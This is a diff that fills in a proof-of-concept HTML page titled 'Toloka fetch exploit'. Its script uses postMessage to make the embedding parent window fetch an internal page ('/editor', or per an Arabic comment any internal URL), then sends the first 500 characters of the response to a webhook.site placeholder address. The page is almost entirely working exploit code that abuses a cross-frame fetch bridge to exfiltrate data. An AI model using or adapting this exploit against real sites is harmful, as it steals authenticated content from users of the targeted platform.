@@ -1,12 +1,46 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>fetch exploit</title></head>
+<head>
+  <meta charset="utf-8" />
+  <title>fetch exploit</title>
+  <style>body{font-family:sans-serif;padding:20px}</style>
+</head>
 <body>
-<h3 style="font-family:sans-serif;color:#c00">Toloka RPC exploit PoC</h3>
-<pre id="out"></pre>
+  <h2 style="color:red">Toloka fetch exploit</h2>
+  <pre id="log"></pre>
 
 <script>
-/* code will be inserted later */
+const log = (msg) => {
+  console.log(msg);
+  document.getElementById('log').textContent += msg + '\n';
+};
+
+const id = crypto.randomUUID();
+
+window.addEventListener("message", function handler(e) {
+  if (e.data?.id === id && e.data?.name === 'fetch:response') {
+    log("[✔] Data received from parent!");
+    log("Length: " + e.data.payload.length);
+    fetch("https://webhook.site/YOUR-UNIQUE-ID", {
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: e.data.payload.slice(0, 500)
+    });
+    window.removeEventListener("message", handler);
+  }
+});
+
+// اطلب من النافذة الأم أن تنفذ fetch إلى /editor أو أي URL داخلي
+window.parent.postMessage({
+  id,
+  name: "fetch",
+  payload: {
+    url: "/editor",
+    requestInit: { method: "GET" }
+  }
+}, "*");
+
+log("[i] Sent fetch request to parent...");
 </script>
 </body>
 </html>
